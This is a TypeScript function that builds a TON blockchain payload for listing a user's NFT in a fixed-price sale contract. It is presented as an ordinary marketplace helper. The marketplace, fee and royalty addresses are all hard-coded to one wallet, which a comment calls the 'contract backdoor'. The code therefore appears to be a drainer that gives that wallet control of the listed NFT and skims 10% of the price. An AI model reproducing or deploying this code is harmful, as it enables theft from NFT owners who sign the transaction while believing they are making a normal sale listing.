import { Address, beginCell, StateInit, storeStateInit, toNano, Cell } from '@ton/ton'

  
export function createNftSalePayload(ownerWalletAdress :string, nftAdress: string,  fullPrice: number,) {
    
    const fixPriceV3R2Code = Cell.fromBase64('te6cckECCwEAArkAART/APSkE/S88sgLAQIBIAIDAgFIBAUAfvIw7UTQ0wDTH/pA+kD6QPoA1NMAMMABjh34AHAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVOBfB4IA//7y8AICzQYHAFegOFnaiaGmAaY/9IH0gfSB9AGppgBgYaH0gfQB9IH0AGEEIIySsKAVgAKrAQH30A6GmBgLjYSS+CcH0gGHaiaGmAaY/9IH0gfSB9AGppgBgYOCmE44BgAEqYhOmPhW8Q4YBKGATpn8cIxbMbC3MbK2QV44LJOZlvKAVxFWAAyS+G8BJrpOEBFcCBFd0VYACRWdjYKdxjgthOjq+G6hhoaYPqGAD9gHAU4ADAgB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIKAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AkA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAlsjLHxPLPyPPFlADzxbKAIIJycOA+gLKAMlxgBjIywUmzxZw+gLLaszJgwb7AHFVUHAHyMsAFssfUATPFljPFgHPFgH6AszLAMntVNZeZYk=');

    const marketplaceAddress = Address.parse('UQA2z8L9cQrl8ehB44qvkewpn9D0Q3WzdCYykaGpqCKCn5aq'); 
    // Marketplace Address for contract backdoor
    const marketplaceFeeAddress = Address.parse('UQA2z8L9cQrl8ehB44qvkewpn9D0Q3WzdCYykaGpqCKCn5aq');
     // Marketplace Address for Fees
    const destinationAddress = Address.parse("EQCAD9rvrBgkbAUjRuszyHU6Q2Px4bSM2dVCKbe5cb1wNKNV"); 
    // Marketplace sale contracts deployer

    const walletAddress = Address.parse(ownerWalletAdress);
    const royaltyAddress = Address.parse('UQA2z8L9cQrl8ehB44qvkewpn9D0Q3WzdCYykaGpqCKCn5aq');
    const nftAddress = Address.parse(nftAdress);
    const price = toNano(fullPrice);

    const feesData = beginCell()
        .storeAddress(marketplaceFeeAddress)
        // 5% - Marketplace fee
        .storeCoins(price / BigInt(100) * BigInt(5))
        .storeAddress(royaltyAddress)
        // 5% - Royalty, can be changed
        .storeCoins(price / BigInt(100) * BigInt(5))
        .endCell();

    const saleData = beginCell()
        .storeBit(0)                                   // is_complete
        .storeUint(Math.round(Date.now() / 1000), 32) // created_at
        .storeAddress(marketplaceAddress)            // marketplace_address
        .storeAddress(nftAddress)                   // nft_address
        .storeAddress(walletAddress)               // previous_owner_address
        .storeCoins(price)                        // full price in nanotons
        .storeRef(feesData)                      // fees_cell
        .storeUint(0,32)                        // sold_at
        .storeUint(0,64)                       // query_id
        .endCell();

    const stateInit : StateInit= {
        code: fixPriceV3R2Code,
        data: saleData
    };
    const stateInitCell = beginCell()
        .store(storeStateInit(stateInit))
        .endCell();

    // not needed, just for example
    const saleContractAddress = new Address(0, stateInitCell.hash());

    const saleBody = beginCell()
        .storeUint(1, 32) // just accept coins on deploy
        .storeUint(0, 64)
        .endCell();
        

    const transferNftBody = beginCell()
        .storeUint(0x5fcc3d14, 32)          // Opcode for NFT transfer
        .storeUint(0, 64)                  // query_id
        .storeAddress(destinationAddress) // new_owner
        .storeAddress(walletAddress)     // response_destination for excesses
        .storeBit(0)                    // we do not have custom_payload
        .storeCoins(toNano(0.2))       // forward_amount
        .storeBit(0)                  // we store forward_payload is this cell
                                     // not 32, because we stored 0 bit before | do_sale opcode for deployer
        .storeUint(0x0fe0ede, 31)
        .storeRef(stateInitCell)
        .storeRef(saleBody)
        .endCell();

    return transferNftBody.toBoc().toString("base64")
};
